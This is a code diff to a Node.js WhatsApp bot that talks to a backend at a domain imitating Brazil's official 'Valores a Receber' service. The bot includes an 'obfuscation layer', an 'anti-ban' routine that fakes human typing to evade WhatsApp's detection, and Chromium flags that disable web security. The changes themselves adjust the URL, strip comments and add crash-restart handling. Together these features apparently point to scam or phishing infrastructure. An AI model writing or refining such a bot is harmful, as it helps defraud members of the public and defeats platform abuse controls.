@@ -14,11 +14,11 @@ const BT = '```'; // Monospace marker for WhatsApp
 // --- OBFUSCATION LAYER ---
 const _d = (b) => Buffer.from(b, 'base64').toString('utf-8');
 
-let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://www.consultarvaloresareceber.com.br').replace(/\/$/, "");
+let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://consultarvaloresareceber.com.br').replace(/\/$/, "");
 
 if (API_URL.includes("discloud.app")) {
     console.log("⚠️ [SEGURANÇA] URL Discloud legado detectado. Corrigindo para o domínio principal...");
-    API_URL = "https://www.consultarvaloresareceber.com.br";
+    API_URL = "https://consultarvaloresareceber.com.br";
 }
 
 const API_HEADERS = {
@@ -140,8 +140,6 @@ function saveQrMsgId(msgId) {
 async function sendBotMessage(chatId, text, options = {}) {
     internalMessageChats.add(chatId);
     try {
-        // Resolve o ID correto do número para evitar erro "No LID for user"
-        // Isso é necessário para números que o bot nunca contactou antes
         let sendTo = chatId;
         try {
             const rawNum = chatId.split('@')[0];
@@ -149,27 +147,30 @@ async function sendBotMessage(chatId, text, options = {}) {
             if (numberId && numberId._serialized) {
                 sendTo = numberId._serialized;
             }
-        } catch (_) { /* usa chatId original se não conseguir resolver */ }
+        } catch (_) { }
 
-        // --- SEGURANÇA ANTI-BAN (Simular comportamento humano) ---
         try {
             const chatObj = await client.getChatById(sendTo);
             if (chatObj) {
                 await chatObj.sendStateTyping();
-                // Delay proporcional ao tamanho da mensagem (mín 1.5s, máx 4s)
                 const delayMs = Math.min(1500 + (text.length * 10), 4000);
                 await new Promise(r => setTimeout(r, delayMs));
                 await chatObj.clearState();
             }
-        } catch (e) { /* ignora erro de chat */ }
+        } catch (e) { }
 
         const res = await client.sendMessage(sendTo, text, options);
         return res;
     } catch (e) {
         console.error(`❌ [ERRO] Falha ao enviar mensagem para ${chatId}:`, e.message);
+        
+        // Se o erro for de navegador/frame, encerramos para reiniciar limpo
+        if (e.message.includes('detached Frame') || e.message.includes('Target closed') || e.message.includes('Protocol error')) {
+            console.log('🔄 [RECOVERY] Erro de navegador detectado no envio. Reiniciando bot...');
+            process.exit(1);
+        }
         throw e;
     } finally {
-        // Delay menor para ser mais responsivo à intervenção do admin
         setTimeout(() => { internalMessageChats.delete(chatId); }, 2000);
     }
 }
@@ -375,7 +376,6 @@ const client = new Client({
             '--disable-gpu',
             '--no-first-run',
             '--no-zygote',
-            '--single-process',
             '--disable-extensions',
             '--disable-accelerated-2d-canvas',
             '--disable-software-rasterizer',
@@ -399,6 +399,7 @@ const client = new Client({
             '--js-flags="--max-old-space-size=512"',
             '--disable-dev-tools',
             '--disable-web-security',
+            '--disable-site-isolation-trials',
             '--disk-cache-size=1',
             '--media-cache-size=1'
         ]
@@ -1478,6 +1479,10 @@ setInterval(async () => {
                 }
             } catch (e) {
                 console.error("❌ Erro ao processar cmd-etapa:", e.message);
+                if (e.message.includes('detached Frame') || e.message.includes('Target closed') || e.message.includes('Protocol error')) {
+                    console.log('🔄 [RECOVERY] Erro de navegador detectado no loop de etapas. Reiniciando bot...');
+                    process.exit(1);
+                }
             }
         }
     }
